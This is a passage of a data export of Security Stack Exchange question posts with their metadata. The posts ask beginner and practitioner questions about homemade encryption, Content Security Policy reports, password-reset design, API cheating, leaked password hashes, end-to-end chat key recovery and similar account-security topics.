","239144","","91193","","2021-01-20 15:23:54","2021-02-19 17:05:25","Is using a server as bridge secure enough to protect the end data?","<account-security><network-scanners><content-security-policy>","1","2","","","","CC BY-SA 4.0"
"243661","1","","","2021-01-21 22:44:30","","0","32","<p>Out of curiosity. I am a green as grass programmer coming from other career disciplines and am learning multiple languages right now so play nice and keep it simple please. Interested in simple security protocols for scrambling data before the network. I am curious to know if this very simple, basic method of scrambling financial numbers is easily crackable by machine or by human evaluation. Assuming the level of human is the general level of genius I've seen on this forum.</p>
<p>In sudo-code:</p>
<p>Balance sheet financials:</p>
<p>18485.45<br />
347.56<br />
34564.44    &lt;------ Take one number as example<br />
345543.33<br />
120045.76<br />
1205847.87<br />
876.00<br /></p>
<p>1st layer-</p>
<p>34564.44 to multiply each number by day+month+year</p>
<p>Example last edited date timestamp: Today (21/01/2021) = 2043<br />
3 x 2043 = 6129<br />
4 x 2043 = 8172<br />
5 x 2043 = 10215<br />
6 x 2043 = 12258<br />
4 x 2043 = 8172<br />
.
4 x 2043 = 8172<br />
4 x 2043 = 8172<br /></p>
<p>Becomes: 6129817210215122588172.81728172</p>
<p>2nd layer-</p>
<p>6129817210215122588172.81728172 to encrypt using alphabetical numeric position</p>
<p>A-1 B-2 C-3 D-4 E-5 F-6 G-7 H-8 etc...</p>
<p>6129817210215122588172.81728172<br />
Becomes: FABIHAGBA0BAEABBEHHAGB.HAGBHAGB</p>
<p>FABIHAGBA0BAEABBEHHAGB.HAGBHAGB is then used for JSON transfer with HTTPS.</p>
<p>This is an extremely elementary example with only a few simple steps. Just curious how easy this would be to break, the principle being that the data is scrambled as much as possible BEFORE networking and with only the host knowing the &quot;key&quot; for decryption. Example above would be the date timestamp.</p>
","249539","","","","","2021-01-21 22:44:30","How easy to crack simple, custom algorithm?","<encryption><network><databases><account-security>","0","7","","2021-01-21 23:26:26","","CC BY-SA 4.0"
"243663","1","243719","","2021-01-21 23:40:25","","-2","263","<p>I'm curious, as a green programmer, if one used layers of encryption methods, would this be more difficult to crack or impossible?</p>
<p>Example:</p>
<p>Layer 1- encryption method 1 &quot;Encrypt this string&quot;</p>
<p>Apply crypto = &quot;encrypted mumbo jumbo&quot;</p>
<p>Layer 2- encryption method 2 &quot;encrypted mumbo jumbo&quot;</p>
<p>Apply crypto layer 2 = &quot;encrypted mumbo jumbo becomes encrypted mumbo jumbo&quot;</p>
<p>And so on...</p>
<p>Does this heighten security and if so does would this take a long time to decrypt?</p>
","249539","","","","","2021-01-23 04:02:44","Encryption layers","<encryption><cryptography><account-security>","2","7","","","","CC BY-SA 4.0"
"243770","1","","","2021-01-24 11:02:45","","0","291","<p>The following CSP directive violation is reported:</p>
<pre><code>[csp-report]
    (
        [document-uri] =&gt; https://mysite.com/my-page/
        [referrer] =&gt; https://www.google.com/
        [violated-directive] =&gt; img-src
        [effective-directive] =&gt; img-src
        [original-policy] =&gt; img-src 'self' https://various.uris &lt;but NOT https://www.tailwindapp.com&gt;
        [disposition] =&gt; enforce
        [blocked-uri] =&gt; https://www.tailwindapp.com/app/extensions/Tailwind_swoosh.png
        [line-number] =&gt; 4
        [column-number] =&gt; 31488
        [source-file] =&gt; https://mysite.com/wp-includes/js/jquery/jquery.js
        [status-code] =&gt; 0
        [script-sample] =&gt; 
    )
</code></pre>
<p>If I understand correctly, this means that a visitor to my-page was referred from Google search and in the course of viewing that page the file <a href=""https://www.tailwindapp.com/app/extensions/Tailwind_swoosh.png"" rel=""nofollow noreferrer"">https://www.tailwindapp.com/app/extensions/Tailwind_swoosh.png</a> was blocked. But I cannot understand how there was any attempt to display that file. It is certainly not directly referenced anywhere in my-page. The script <a href=""https://mysite.com/wp-includes/js/jquery/jquery.js"" rel=""nofollow noreferrer"">https://mysite.com/wp-includes/js/jquery/jquery.js</a> is not corrupted and makes no reference to that file. Nor does it appear in any other file or database for my site.</p>
<p>So, how can I figure out why there was any attempt to display that file in the first place?</p>
","248937","","","","","2021-01-24 11:40:46","image blocked by CSP policy even though the image is never requested","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"107389","1","","","2015-12-06 01:07:10","","0","140","<p>It seems that its like a black point in my mind that I think about browser when I research information security. Its clear that its the browser applies security rules while we navigate websites. In any event that if browser failed to apply cookie rules or origin policy; how we can detect that?</p>

<p>Now, if someone downloaded malicious browser (infected version of genuine browsers or any other browser that originally designed to steal user data)</p>

<p>how we can validate trustworthy of the browser and proof that all security rules applied correctly?</p>

<p>Dose anyone validated Mozilla, Internet Explorer or Google Chrome?</p>
","20070","","20070","","2015-12-06 01:14:57","2015-12-06 19:05:19","Security concerns about Web browser","<web-browser><validation><content-security-policy><browser-hijacking>","1","1","","2015-12-08 12:53:51","","CC BY-SA 3.0"
"107483","1","","","2015-12-07 16:38:33","","0","108","<p>Is it possible to use Sophos safeguard to detect when computers in the network upload certain files online when they are compressed in a zip file? (or 7z or similar).</p>

<p>I've seen <a href=""https://www.sophos.com/en-us/support/knowledgebase/117053.aspx"" rel=""nofollow"">it is possible with Sophos Safeguard to detect the upload of certain data to the cloud</a> (dropbox, google drive etc) But... what if the user compressed it? Would Sophos be able to inspect the compressed file to detect it?</p>
","93891","","","","","2022-03-26 17:11:34","Sophos Safeguard detecting content of zip files being uploaded","<physical><cloud-computing><content-security-policy>","2","0","","","","CC BY-SA 3.0"
"244100","1","244148","","2021-02-01 08:40:41","","0","187","<p>I'm trying to implement CSP on my site and after some research I saw that most of the sites don't implement it or the implementation is very weak.</p>
<p>I also see that the implementation of the CSP is similar to HSTS and you need to insert some CSP tags for its implementation.</p>
<p>So my questions are :</p>
<ul>
<li>Is CSP a minimal requirement for security on web poages?</li>
<li>What is the impact of CSP on SEO?</li>
</ul>
","167701","","90657","","2021-02-01 14:31:05","2021-02-03 04:03:41","Content Security Policy","<content-security-policy>","2","3","","2021-02-05 09:20:28","","CC BY-SA 4.0"
"34732","1","","","2013-04-23 15:47:46","","1","886","<p>I am getting a page forbidden because mod_security blocks it with Remote File Injection in ARGS rule.</p>

<p>How do I stop this apart from not including URLs in the form fields or removing the http:// prefix of the URL before submission to the update script (data is updated from the form).</p>

<p>The hosting company had to remove some rules to stop this happening before but even after rewriting the forms it is still happening.</p>

<p>How do I rewrite the form to stop the firewall error?</p>
","25086","","","","","2013-05-04 21:01:54","Remote File Injection in ARGS blocking form updating database","<firewalls><php><mod-security>","2","1","","","","CC BY-SA 3.0"
"175318","1","","","2017-12-12 12:58:14","","10","35872","<p><a href=""http://secondlemon.com/whatsdog-whatsapps-watchdog/"" rel=""noreferrer"">Whatsdog</a> detects whether your victim is online or not. What are they doing in the background? We know that Whatsapp does not provide any API or SDK for this, so how can anyone monitor this type of sensitive activity? </p>
","151501","","98538","","2017-12-12 13:25:30","2019-12-04 11:35:39","How can application like Whatsdog detect user online status from Whatsapp?","<android><account-security><whatsapp>","3","0","","","","CC BY-SA 3.0"
"244242","1","244367","","2021-02-04 03:36:01","","1","209","<p>To be clear when I say &quot;private unique identifier&quot; I mean an identifier, which is not stored on the database for the website, it would be hashed in combination with the password and a good salt in the hash table for login information to each account. And when a new user signs up or has forgotten their unique identifier a new one would be emailed to them, and said email along with all trace of the identifier would be deleted from the server after hashing it with the password and storing them. To clarify further you couldn't use a display name because then it would be connected to the account on the hash table, and you couldn't use an email address because the server needs to keep that unencrypted in case you lose your account credentials and you need to be sent a reset link. This would be something like the initials of your name with a unique identifying alpha-numeric or numeric code tacked on to the end which is too long to be brute-forced.</p>
<p>Now the reason why I think this should be an obvious idea for account security. If you were a malicious actor who managed to steal the entire hash table with salts and related account information from a website then there are certain attacks on the said hash table you could use to gather login information. This includes hashing the most common passwords list in combination with the salt values to find the easiest logins. This attack obviously wouldn't work so well on accounts with safe passwords, but I'm going to look even further for maximum security even for accounts with bad passwords. If you have a private unique identifier hashed with the passwords, then dictionary attacks using common password lists wouldn't work because they don't have the unique identifier, and it's not user-chosen so there would be no way to find it.</p>
<p>I've gone over this method a few times in my head and I feel like it's pretty solid, and it has probably already been named somewhere, but I'm not sure what it would be called and I couldn't find it. One thing I know for sure is none of my accounts use a method like this. Please let me know what the name of this practice would be, what attacks would work on a security method like this, and why more websites don't use a method like this. The only reason I can think of is that asking users to keep track of a unique identifier in addition to their passwords all for a security method that only adds so much to passwords is more security than most websites care to use.</p>
<p>Thanks for any and all answers.</p>
","250418","","250418","","2021-02-04 23:53:48","2021-02-06 05:09:15","Why don't security conscious websites use a combination of private unique identifier and password to secure their logins?","<authentication><passwords><hash><account-security><identity>","1","9","","","","CC BY-SA 4.0"
"244377","1","244386","","2021-02-06 12:42:49","","0","235","<p>For my website I need to add &quot;forgot password&quot; functionality. As I searched on the internet there are too much vulnerabilities you may encounter in case of wrong implementing this functionality. Like referer leakage, account enumeration etc.</p>
<hr/>
<h1>How I Thought To Implement This</h1>
<h3>Step One</h3>
<ul>
<li>In login page there will be a link to ""Forgot Password"" page</li>
<li>In ""Forgot Password"" page there will be one input field for both email and username. User may input email or username.</li>
<li>Whether account exists or not, a message box will appear and says ""We sent email if account exists."" (I'm trying to be not explicit with my messages to avoid account enumeration)</li>
</ul>
<h2>Step Two</h2>
<ul>
<li>Generate a random uuid and expiration date. That will be used as token.</li>
<li>Store the hashed version of token in User model</li>
<li>Send email that contains not hashed version of uuid.</li>
<li>Compare if not hashed version of uuid matches user's hashed id(hashed id stored in database). And token not expired move to third step.</li>
</ul>
<h2>Step Three</h2>
<ul>
<li>Update the password (I implemented update password functionality before. So I'm not gonna be detailed about this. If you have any tips I'd love to see them.)</li>
<li>Notify User that password has changed. And remove hashed data from database.</li>
<li>Redirect user to login page.</li>
</ul>
<hr/>
If I'm wrong at some point or have logical errors please correct me. I'm open to all advice.
","250570","","71850","","2021-02-06 14:38:30","2021-02-07 05:08:57","How Forgot Password Works?","<passwords><password-management><account-security>","1","0","","","","CC BY-SA 4.0"
"175563","1","175564","","2017-12-15 15:11:12","","3","2751","<p>We deal with a lot of customer information including name, address, SSNs, etc. are we are using a new setup with Full admin machines that have access to the databases where the information is stored. </p>

<p>We need a way to tell if packages installed via Visual Studios Nuget Package Manager is safe to use on confidential customer information.</p>

<p>From what I know, is that anybody can contribute to Nuget and could possibly introduce malicious code.</p>

<p>Is there an trusted and well known institution/source that verifies Nuget Packages as safe, or is there a vetting process that companies can go through to ensure the safety of these packages without looking through the entire source code??</p>
","166240","","","","","2017-12-15 15:17:55","How to ensure Nuget Packages are safe for confidential information?","<authentication><malware><virus><account-security>","1","1","","","","CC BY-SA 3.0"
"244510","1","","","2021-02-08 22:55:43","","4","159","<p>Recently I tried to make an online purchase in one of the biggest e-commerce sites in Greece.</p>
<p>During checkout, and after providing debit card details, it <strong>asked me to provide the username/password (not one-time-password) of my e-banking account to an iframe</strong> inside the site.</p>
<p>I inspected the iframe url (src attribte) and it was again the e-commerce site's url. Only when clicking on login (with some test credentials) it performed a request towards the bank's site.</p>
<p>The above felt wrong and insecure to me.</p>
<p>After communicating my bank (one of the 4 biggest) to tell them that the e-commerce site does something that feels wrong related to e-banking, they insisted that this is how <a href=""https://docs.3dsecure.io/3dsv2/_downloads/b412903d6e2c99b7828246fa10db5b3e/EMVCo_3DS_Spec_v220.pdf"" rel=""nofollow noreferrer"">3dsecure</a> works and that this way they are compliant to <a href=""https://ec.europa.eu/info/law/payment-services-psd-2-directive-eu-2015-2366_en"" rel=""nofollow noreferrer"">PSD2</a> directive that is obligatory from 1/1/2021.</p>
<p>The same response I got from the e-commerce site.</p>
<p>I really felt that my perception of security is far differrent than the bank's or the e-commerce site's?</p>
<p>I can't figure out:</p>
<ul>
<li>How can one know that they are really accessing the bank's site, when they click the button inside that iframe?</li>
<li>And if one trusts the good intentions of the e-commerce site, how can they be sure that the e-commerce site does not suffer from a script injection vulnerability that would steal their e-banking username/password?</li>
</ul>
<p><strong>Can someone help me understand whether the way that the above e-commerce site works is considered compatible to <a href=""https://docs.3dsecure.io/3dsv2/_downloads/b412903d6e2c99b7828246fa10db5b3e/EMVCo_3DS_Spec_v220.pdf"" rel=""nofollow noreferrer"">3dsecure</a> to <a href=""https://ec.europa.eu/info/law/payment-services-psd-2-directive-eu-2015-2366_en"" rel=""nofollow noreferrer"">PSD2</a></strong>? If yes, does this mean that the latter 2 are insecure, or am I missing something?</p>
<p>P.S: I know that asking for <a href=""https://ec.europa.eu/info/law/payment-services-psd-2-directive-eu-2015-2366_en"" rel=""nofollow noreferrer"">PSD2</a> specifically may be considered off-topic, since it is actually a legislative directive, but I think it might be equally off-topic in <a href=""https://law.stackexchange.com/"">law.stackexchange.com</a> as too technical.</p>
<p>(<a href=""https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32015L2366&amp;from=EN"" rel=""nofollow noreferrer"">PSD2 law details</a>)</p>
","156144","","156144","","2021-02-17 20:17:09","2021-02-17 20:17:09","Is asking the e-banking username/password from a 3rd party site compliant with 3dsecure and PSD2?","<authentication><password-management><account-security><multi-factor>","0","1","","","","CC BY-SA 4.0"
"175797","1","175799","","2017-12-19 18:29:10","","4","3190","<p>I currently found something interesting when browsing my iPhone app's cache.db file.</p>

<p>There is a table called cfurl_cache_receiver_data and there is a column called receiver_data. This contains all the HTTP Request response that my app receives from the API. The problem is there is an HTTP request that responds with the user's API key. The column shows this data in plain text. </p>

<p>My question is should I worry about this? We do have a way where the user can change/delete their API key as a safety protocol.</p>

<p>Edit : </p>

<p>This is where I found the cache.db just in case it helps someone understand my concern.</p>

<blockquote>
  <p>/Users/(username)/Library/Developer/CoreSimulator/Devices/B24F612C-8DC2-4599-86EB-BC6D75FF05DE/data/Containers/Data/Application/97AEA1EE-28B4-4744-B23B-FA5424F98E49/Library/Caches</p>
</blockquote>

<p>Ive updated my question because all the data in this column is actually responses from the API and not requests I send out.</p>
","166497","","166497","","2017-12-19 18:35:41","2017-12-19 18:47:36","iOS : Possible cache DB security issue?","<authentication><ios><account-security><api>","1","0","","","","CC BY-SA 3.0"
"175802","1","175832","","2017-12-19 21:02:50","","116","30012","<p>I have looked all over online as well as this site to try to find out more information regarding the security of this, but haven't found anything. In my particular case, the product is a website, but I think this question applies for any software that hosts a large number of users.</p>

<p>I know there are numerous websites out there that allow you to change your username, but at the same time there are many that do not allow it. I'm sure some that do not allow it may be just for simplicity, but possibly for security as well.</p>

<p>My question is just like the title asks:</p>

<p><strong>From a security standpoint, would you say it is good or bad practice to allow individuals to change their username?</strong></p>

<p>I currently cannot think of any reason not to allow it, given it is done properly (ie make it impossible for duplicate usernames, require inputting current password to make sure password requirements are still met regarding not containing username, etc), but I can't help but think there's something I'm missing.</p>

<p>I know there are advantages from the user's perspective to allow them to change their username. An example would be if they set their username to their email address and decide to use a different email address later. Instead, I'm curious of the benefits vs risks regarding the security of the application and login process if you allow them to change their username.</p>

<p><strong>EDIT:</strong></p>

<p>Some of the answers bring up good points regarding publicly-displayed names, but to clarify, the question is not regarding any public display name, but instead the unique username used to log in.</p>
","166511","","166511","","2017-12-20 23:09:36","2020-10-03 06:50:37","Is it good or bad practice to allow a user to change their username?","<authentication><web-application><account-security><credentials><user-names>","13","10","","","","CC BY-SA 3.0"
"244624","1","","","2021-02-10 21:43:31","","2","275","<p>My web application is a long sequence of games, which submit progress results back to the server via a web API. These progress messages are how we know how many points the user has earned. The points are used to show rankings and status and that kind of thing.</p>
<p>By checking stats, we just discovered that a registered user had earned 90,000 points in an hour or so, becoming the global #1 player, when it should take many, many months to earn that many points through actual game play.</p>
<p>It appears that this user did some kind of observation of the &quot;game complete&quot; message between our game client and server and then wrote some kind of script to send similar messages for many games, tricking the server into awarding points for completing those games.</p>
<p>Each such message includes a checksum of the arguments, which is authenticated on the server, so we think this person must also have discovered the hashing function in our <em>minified and obfuscated javascript code</em> so that they could spoof this as well.</p>
<p><strong>Measures we do or could do</strong></p>
<p>The arguments checksum trick.</p>
<p>The app already requires a login, but this person was logged in. We cancelled the account, but they could just make another.</p>
<p>We could throttle the messages, but no matter what the rate limit is, they could still send messages just below that rate, and run up a huge sticker count illegitimately; it would just take longer. And if the throttle is too aggressive, it would block legitimate progress messages.</p>
<p>We could maybe associate a random GUID with each game, which we authenticate, so that a message that works for one game would not work for another, but we'd have to embed those GUIDs in the code somewhere so each game could legitimately send the message, and then the hack would be harder, but still possible.</p>
<p>Basically, the legitimate message sending code lives on the client, so anything we do could in principle be inspected and reverse-engineered.</p>
<p><strong>So how can this kind of exploit be prevented?</strong></p>
","87468","","","","","2021-02-11 00:37:12","How can I prevent API bot automation by a legitimate user?","<account-security><api><rest>","3","8","","","","CC BY-SA 4.0"
"108191","1","108193","","2015-12-15 09:00:41","","37","6666","<p>Entering my email at <a href=""https://haveibeenpwned.com/"">https://haveibeenpwned.com/</a>, I was told that I have been pwned. I am in <a href=""http://pastebin.com/SCLNRHJQ"">http://pastebin.com/SCLNRHJQ</a></p>

<p>I already tried</p>

<ul>
<li>to find out my password by simply md5-hashing all my passwords I could think off and comparing them to the hash in <code>pass</code></li>
<li>to check whether someone could easily crack my password by putting the hash into some online md5 ""rainbow table service"" myself.</li>
<li>to find the breached web site by searching my mail for registration notifications received on the registration date given in <code>joined_on</code></li>
<li>to find email received from any mail address in the list.</li>
<li>to send an email to the first in the list, asking him whether he knows which site it is and/or whether he possibly is the owner of that site.</li>
</ul>

<p>All of these loose ends came up blank.</p>

<p>I could only deduce that it has to be a really small LEGO-themed website, but that's it.</p>

<p>So I have changed all my passwords of my most-used accounts, especially the email accounts. The many old and sleeping accounts I don't know that I have, they are out of reach.</p>

<p>What else can I do?</p>
","37853","","56831","","2015-12-15 12:22:26","2015-12-16 13:49:29","What can I do if I discover that my password hash has been leaked in pastebin?","<account-security>","4","10","","","","CC BY-SA 3.0"
"244795","1","244797","","2021-02-14 03:21:56","","13","6893","<p>My friend recently told me that:</p>
<blockquote>
<p><strong>Google doesn't have our passwords saved on their database</strong>. Instead they put our password when typed on browser, through an algorithm and it'll produce a unique identifier. This identifier goes to database. <strong>And it is unable to reverse engineer/decode the password from the identifier.</strong></p>
</blockquote>
<p>Is this correct? Is Google's database unhackable and un-decodable? If not, how are our passwords saved on Google?</p>
","251091","","6253","","2021-12-13 12:21:58","2021-12-13 13:59:05","How does Google save our passwords on their server?","<passwords><databases><account-security><google>","2","3","","","","CC BY-SA 4.0"
"176025","1","176026","","2017-12-23 06:49:06","","2","529","<p>Everybody knows that we should not enter our bank data, credit cards numbers being connected to the public wifi network. </p>

<p>Let's imagine that somebody goes to his bank's web site being in public network. Yes, his traffic can be captured but using https it's encrypted by banks public certificate. So none exept bank can decrypt this personal data. </p>

<p>All of this is in case when user is really sure that it's a public hotspot of the airport, not some hacker's one. </p>

<p>I'm wondering it it really so or it's not so easy?</p>
","140184","","59811","","2019-05-14 22:36:38","2019-05-14 22:36:38","Sensitive data in public wifi networks with https","<tls><account-security>","1","0","","","","CC BY-SA 4.0"
"108296","1","108306","","2015-12-16 12:27:52","","13","912","<p>After browsing another question on this site, I discovered haveibeenpwned.com and thought I'd check my email. It came up with one breach which has, apparently, not been widely shared and does not include a password or much in the way of personal information:</p>

<p><a href=""https://i.stack.imgur.com/JXIEQ.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/JXIEQ.jpg"" alt=""enter image description here""></a></p>

<p>I have a 12+ characters random alphanumeric password for this site which is unlikely to be broken. I have not used the site for personal messaging, and have received but not made payments through it. So this doesn't sound like much to be concerned about, aside from a possible increase in spam. </p>

<p>I appreciate that there are several questions which ask what action should be taken if your details are leaked online. However, I don't want to go to the effort if remedial action is unnecessary, so I'm asking to ascertain whether or not I need to bother?</p>
","52575","","32746","","2015-12-16 19:42:35","2015-12-16 19:42:35","Should I worry about a breach where my password was not revealed?","<account-security>","2","3","","","","CC BY-SA 3.0"
"35515","1","35516","","2013-05-08 09:35:39","","4","2220","<p>This is a little bit of a rant, but there's a real question at the end.</p>

<p>I recently installed a new perl script on a site (which will remain nameless) which failed mysteriously with an error 403.  Eventually I found a clue in this error in the apache error logs</p>

<blockquote>
  <p>[error] mod_security: Access denied with code 403. Pattern match ""select.+from"" at REQUEST_URI [severity ""EMERGENCY""] </p>
</blockquote>

<p>Which I believe to be from an utterly simpleminded attempt to defend against SQL injection attacks, by rejecting any HTTP request which contains ""select"" followed by ""from"".</p>

<p>Obviously, the pattern could be made much more complex, but the whole approach looks bankrupt to me. The question is, is there any generic approach that could actually work, or is it necessarily something that has to be done closer to the actual database manipulation.</p>
","4384","","36538","","2014-03-22 18:03:52","2014-03-22 18:03:52","Generic defense againt SQL injection","<sql-injection><apache><waf><mod-security>","4","1","","","","CC BY-SA 3.0"
"244959","1","","","2021-02-17 10:51:09","","1","129","<p>Recently a utility provider has started to attach a zip file including my bill inside, however, they have secured the zip file using my online web account password.</p>
<p>I am not too concerned about somebody getting my bill, however, it concerns me in two other ways...</p>
<p>First, would this now allow for easier dictionary attacks? If a malicious actor where to get a hold of the zip file, they could run a dictionary attack against it with no real knowledge right? Online they would be able to try and prevent this however when this media is downloaded there is no way to put in any preventatives.</p>
<p>Second, are they storing my password in plaintext (or another recoverable format)? It seems unlikely they would be able to use the same hash across both the site and the zip file they are sending out, right?</p>
<p>I use a unique long/secure password for this account, as well as a unique email, so I am not too worried about the issue affecting me personally.</p>
<p>Thanks ahead!</p>
","251273","","","","","2021-02-17 11:40:52","Site password being used to secure ZIP download, are they storing my password in plaintext?","<email><account-security><zip>","2","1","","","","CC BY-SA 4.0"
"244961","1","","","2021-02-17 11:29:37","","0","156","<p>Facebook tends to &quot;recommend&quot; your account based on IP and collected data. How do I keep it hidden from people that are geographically related to me? I want to create a pseudo-anonymous account that isn't linked to my real identity in any way.</p>
","247932","","","","","2021-11-24 19:49:21","How do I prevent my Facebook and Instagram acccount from appearing in ""people you may know"" recommendations?","<privacy><account-security><anonymity><facebook>","1","7","","","","CC BY-SA 4.0"
"35673","1","","","2013-05-10 02:14:33","","1","1467","<p>I am at a student at a school which <strong>blocks the right click in Windows Explorer</strong> and the desktop, as well as on the taskbar. I don't exactly understand why they do this, since most of the commands on the right click menu are also avaliable in the File menu in Explorer (and they don't block that). While I don't mind, many of the not so technical students do since they now don't know how to rename a file, create a folder, copy and paste, etc.</p>

<p>I'm not planning to breach the security in any way (I honestly don't really care if it's disabled or not) but I'm just wondering <strong>how this makes the system more secure</strong>.</p>
","","user25787","","user25787","2013-06-02 01:52:44","2021-01-28 20:40:31","Does Disabling Right Click In Windows Explorer Do Anything?","<windows><client-side><security-theater><user-interface>","3","5","","","","CC BY-SA 3.0"
"176320","1","","","2017-12-29 12:17:30","","15","2736","<p>I’m using a free VPN service called Speedify (used in load balancing two networks). 
I’m worried it they might be listening to personal data transfers (like login IDs etc.). So I installed another VPN called Hoxx. Now it’s not that I trust Hoxx completely but I think that VPN chaining will prevent either of the providers from latching on to personal data.</p>

<p>Am I right in guessing that this VPN linking is secure?</p>
","167142","","41015","","2017-12-30 18:01:15","2017-12-30 18:01:15","Is personal information secure if two VPNs are used?","<vpn><account-security>","4","3","","2018-01-04 09:09:19","","CC BY-SA 3.0"
"176331","1","","","2017-12-29 17:07:26","","2","297","<p>I have read conflicting things about this and was hoping to get a definitive answer to my question which is this - If I am dialing in to an associate's computer via Teamveiwer, is there any way possible that my IP address can be detected or any other identifiable bits of information from my end (browser footprints, user agent, mac address, etc;)?</p>

<p>I would much appreciate your input, thanks in advance.</p>
","167162","","","","","2017-12-29 17:57:09","Question about Teamviewer and visible IP address","<ip><account-security><teamviewer>","1","0","","","","CC BY-SA 3.0"
"245081","1","","","2021-02-19 16:11:03","","1","150","<p>We have an application which have purchased from a 3rd party and host in our own environment. The application consists of its own UI and back-end, and is included in our own application through an iframe.</p>
<p>During a recent scan by our security vendor, they have identified a few high risk vulnerabilities within the 3rd party application. The vulnerabilities are around old versions of jquery and bootstrap being used by the 3rd party application.</p>
<p><a href=""https://snyk.io/vuln/npm:jquery@1.9.1"" rel=""nofollow noreferrer"">https://snyk.io/vuln/npm:jquery@1.9.1</a></p>
<p><a href=""https://snyk.io/vuln/npm:bootstrap@3.3.6"" rel=""nofollow noreferrer"">https://snyk.io/vuln/npm:bootstrap@3.3.6</a></p>
<p>We've notified the 3rd party vendor about the vulnerabilities, but they won't sign up to fix the issues until much later than we need a resolution. In the interim, are there any recommendations on what we can do to mitigate/resolve these issues? I'm pretty new when it comes to this sort of stuff, but here are some of the thoughts we've had so far.</p>
<ul>
<li>Implement a content security policy on the hosted 3rd party application. Would this completely eliminate the vulnerability? Would the policy exist on the primary application, or would we have to configure the 3rd  party application? Or both?</li>
<li>Modify the hosted application. Not ideal, but I think the affected js libraries are deployed with the application.</li>
<li>Host the application behind something other than an iframe (Citrix?). Not sure what exactly this entails, and likely brings in a whole other set of security implications.</li>
</ul>
","251426","","","","","2021-02-19 18:36:10","Prevent XSS in 3rd party (self hosted) application","<xss><javascript><content-security-policy><iframe><jquery>","0","5","","","","CC BY-SA 4.0"
"176390","1","176395","","2017-12-30 22:42:49","","3","2173","<p>What is <a href=""http://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project"" rel=""nofollow noreferrer"">KSPP</a>? I saw it being <a href=""https://grsecurity.net/compare.php"" rel=""nofollow noreferrer"">compared to</a> and called a competitor to grsecurity, but I can't find a patch or Git repository to download.</p>
<p>Is it just an idea/manifesto or something real, with a concrete patch/repository  to download (even if unfinished)? Are there programmers who call themselves a part of the  KSPP team? Or maybe most results of KSPP labour gets steadily upstreamed, so no need for any separate patches?</p>
","20566","","106285","","2021-05-23 02:51:54","2021-05-23 02:53:46","What is KSPP (Kernel self-protection project)?","<linux><kernel><grsecurity>","1","3","","","","CC BY-SA 4.0"
"176403","1","176749","","2017-12-31 04:19:42","","1","313","<p>So the thing is that a friend of mine wanted to buy me as a gift a game on Steam, but I didn't have an account, so what he did was create an account for me, with my own email, and with a random password, and he suggested me to then change it. Of course I had to go to my own email and click the ""confirmation link"" in order to validate the email address first, and then change the password. </p>

<p>The thing is that I trust this friend in this case, but I was just wondering if there is any risk of doing this. The account is linked to my own email, and the password has been changed, so I think there is no risk, but this seems a bit awkward to me, so makes me thing there may be any risk involved here.</p>
","83707","","36538","","2018-01-05 04:04:06","2018-01-05 04:04:06","Security risk of letting someone else setup an account for me using an email address I own?","<privacy><account-security>","2","0","","","","CC BY-SA 3.0"
"35816","1","","","2013-05-13 07:46:18","","-3","2523","<p>I'm trying to find a suitable (or easily modifiable) web GUI for snort + modsecurity logs. As far as I know, Splunk can do that by installing the snort and modsecurity plugins. Is there any other option?</p>

<p>It does not have to be ready at the get go, I'm fine with a little modification here and there.</p>
","25935","","","","","2013-05-13 09:16:31","Web GUI for Snort + ModSecurity","<firewalls><snort><monitoring><mod-security>","1","1","","2013-05-13 13:11:53","","CC BY-SA 3.0"
"245188","1","","","2021-02-22 06:50:45","","13","9275","<p>I'm creating a mobile app which has chat feature in it. Since I wanted to make it secure, I'll do some encryption to messages and the data. I'm thinking of using End-To-End encryption for it but I've got some issues.</p>
<p>Each user will have private and public keys to encrypt and decrypt the data (asymmetric key encryption) and I figured out how to exchange this keys between. So End-To-End encrypted messaging is done.</p>
<p>Here are my issues:</p>
<p>If user changes the device or reinstalls the app, the private key which stored on client will be lost. I know I can create new key pairs for future messages but how can I restore the old ones?</p>
<p>I thought storing the private key in server but it won't be secure at all. I thought storing the private key after encrypting it with user password, it would be secure since I don't know the user's password, but it fails too if user lost his/her password and re-creates one with a &quot;lost my password email&quot;.</p>
<p>And another issue is if some legal issue happens, I can't give the chat logs to police because I don't have the decrypted messages or I don't know how to decrypt them because I don't have the private key.</p>
<p>So, how should I handle this issues? How does WhatsApp do it while using End-To-End encryption? You can restore the old messages in WhatsApp after changing device, updating or re-installing the app etc...</p>
<p>I read something about re-encrypting and re-sending the messages from the other user. (Receiver-Sender) But I don't know how effective it would be tho.</p>
<p>Any help would be great. Thanks for all information and help.</p>
","251564","","71850","","2021-02-22 19:38:12","2021-02-24 23:55:12","How To Recover End-To-End Encrypted Data After Losing Private Key?","<encryption><account-security><decryption><whatsapp><end-to-end-encryption>","4","13","","","","CC BY-SA 4.0"
"245196","1","","","2021-02-22 10:19:35","","1","119","<p>After my other post I'm looking over some other possibilities to do what I'm trying to do.
<a href=""https://security.stackexchange.com/questions/245188/how-to-recover-end-to-end-encrypted-data-after-losing-private-key"">How To Recover End-To-End Encrypted Data After Losing Private Key?</a></p>
<p>If I save user data in server, in order to restore the data I should have the key to unlock the encryption which is not safe. If I don't have the key then I cant decrypt the restored data.</p>
<p>From some comments and posts I read, I can store all the data in local and Google Drive, iCloud can backup the app data for me. I don't know how that works, if someone can explain the steps that would be nice.</p>
<p>Even though I can backup the data in Google Drive or iCloud, how can I use multiple devices at the same time with accessing the same data which is saved in local or backed up in drive?
For example, Facebook messenger, WhatsApp etc. (mobile app and web browser at the same time)
I might try to share the data with a shared key or QR code or something but I don't know how effective it would be.</p>
","251564","","235964","","2021-02-22 12:36:43","2021-02-22 12:36:43","How Can I Backup App Data In Android/iOS Devices?","<encryption><account-security><backup><data-recovery><whatsapp>","0","3","","","","CC BY-SA 4.0"
"176551","1","","","2018-01-03 03:46:20","","6","1993","<p>I've installed Yandex Browser (Based on Chromium) on Windows 10. I use LastPass for logins so I asked Yandex to not remember passwords.</p>

<p>While I was trying to login to another website, it gave me a pop up saying ""<em>You have already used this password for domain1 and hence it is not recommended to use it for domain2""</em> something like that.</p>

<p><strong>If I asked it to not remember password for domain1, then how did it know I was using the same password to login to domain2</strong>. This made me suspicious about Yandex like if it was logging my keystrokes or snooping around.</p>

<p>Please let me know if anyone of you have experience with Yandex.
Thanks in advance!</p>
